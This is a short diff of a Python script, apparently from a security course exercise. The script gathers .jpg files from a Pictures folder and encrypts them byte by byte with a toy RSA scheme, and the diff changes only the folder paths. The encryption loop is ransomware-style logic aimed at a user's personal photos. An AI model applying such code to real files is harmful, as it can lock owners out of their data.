@@ -10,7 +10,7 @@ def print_banner():
 
 # Get filenames of all picture files in jpg in /home/csc2023/Pictures
 
-folder_path = './Pictures'
+folder_path = '/app/Pictures'
 jpg_files = []
 
 for filename in os.listdir(folder_path):
@@ -23,7 +23,7 @@ e = 65535
 
 plain_bytes = b''
 for filename in jpg_files:
-    filename = './Pictures/' + filename
+    filename = '/app/Pictures/' + filename
     with open(filename, 'rb') as f:
         plain_bytes = f.read()
     cipher_int = [pow(i, e, n) for i in plain_bytes]
